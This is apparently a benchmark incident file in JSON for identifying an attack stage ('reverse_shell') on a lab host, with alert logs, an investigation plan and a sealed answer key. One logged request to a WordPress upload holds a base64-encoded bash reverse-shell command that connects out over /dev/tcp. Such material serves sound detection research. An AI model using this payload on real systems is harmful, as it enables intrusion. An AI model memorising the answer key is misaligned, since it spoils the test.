@@ -1,0 +1,207 @@
+{
+  "incident_id": "ait-wilson-reverse_shell",
+  "name": "AIT-ADS wilson/reverse_shell",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "wilson/reverse_shell",
+  "alert": {
+    "timestamp": "2022-02-07T11:48:08Z",
+    "host": "wilson",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on wilson. Identify the attack stage from telemetry."
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-02-07T11:48:08Z",
+    "end": "2022-02-07T11:48:18Z",
+    "hosts": [
+      "wilson"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-d0fa9939",
+        "timestamp": "2022-02-07T11:48:08Z",
+        "host": "wilson",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.182.193.78 - - [07/Feb/2022:11:48:08 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIyNi43MS80MzI5NDsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506731 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644234488.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.182.193.78 - - [07/Feb/2022:11:48:08 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIyNi43MS80MzI5NDsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506731 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-9ce04283",
+        "timestamp": "2022-02-07T11:48:18Z",
+        "host": "wilson",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  7 11:48:18 intranet-server su[6084]: Successful su for jwilkinson by www-data",
+        "raw_alert": {
+          "timestamp": 1644234498.0,
+          "detector": "AMiner: New event type.",
+          "message": "Feb  7 11:48:18 intranet-server su[6084]: Successful su for jwilkinson by www-data"
+        }
+      },
+      {
+        "event_id": "ait-0003-a24a3fb7",
+        "timestamp": "2022-02-07T11:48:18Z",
+        "host": "wilson",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  7 11:48:18 intranet-server su[6084]: + /dev/pts/1 www-data:jwilkinson",
+        "raw_alert": {
+          "timestamp": 1644234498.0,
+          "detector": "AMiner: New event type.",
+          "message": "Feb  7 11:48:18 intranet-server su[6084]: + /dev/pts/1 www-data:jwilkinson"
+        }
+      },
+      {
+        "event_id": "ait-0004-b4b5a5e4",
+        "timestamp": "2022-02-07T11:48:18Z",
+        "host": "wilson",
+        "detector": "AMiner: New event type.",
+        "message": "Feb  7 11:48:18 intranet-server su[6084]: pam_unix(su:session): session opened for user jwilkinson by (uid=33)",
+        "raw_alert": {
+          "timestamp": 1644234498.0,
+          "detector": "AMiner: New event type.",
+          "message": "Feb  7 11:48:18 intranet-server su[6084]: pam_unix(su:session): session opened for user jwilkinson by (uid=33)"
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-d0fa9939",
+      "source": "alerts",
+      "timestamp": "2022-02-07T11:48:08Z",
+      "host": "wilson",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.182.193.78 - - [07/Feb/2022:11:48:08 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIyNi43MS80MzI5NDsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506731 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644234488.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.182.193.78 - - [07/Feb/2022:11:48:08 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIyNi43MS80MzI5NDsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506731 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-9ce04283",
+      "source": "alerts",
+      "timestamp": "2022-02-07T11:48:18Z",
+      "host": "wilson",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  7 11:48:18 intranet-server su[6084]: Successful su for jwilkinson by www-data",
+        "raw_alert": {
+          "timestamp": 1644234498.0,
+          "detector": "AMiner: New event type.",
+          "message": "Feb  7 11:48:18 intranet-server su[6084]: Successful su for jwilkinson by www-data"
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-a24a3fb7",
+      "source": "alerts",
+      "timestamp": "2022-02-07T11:48:18Z",
+      "host": "wilson",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Feb  7 11:48:18 intranet-server su[6084]: + /dev/pts/1 www-data:jwilkinson",
+        "raw_alert": {
+          "timestamp": 1644234498.0,
+          "detector": "AMiner: New event type.",
+          "message": "Feb  7 11:48:18 intranet-server su[6084]: + /dev/pts/1 www-data:jwilkinson"
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wilson"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wilson"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on wilson. Identify the attack stage from telemetry.",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wilson"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wilson"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on wilson. Identify the attack stage from telemetry.",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "wilson/reverse_shell",
+    "answer": "reverse_shell",
+    "accept": [
+      "reverse_shell",
+      "reverse shell"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
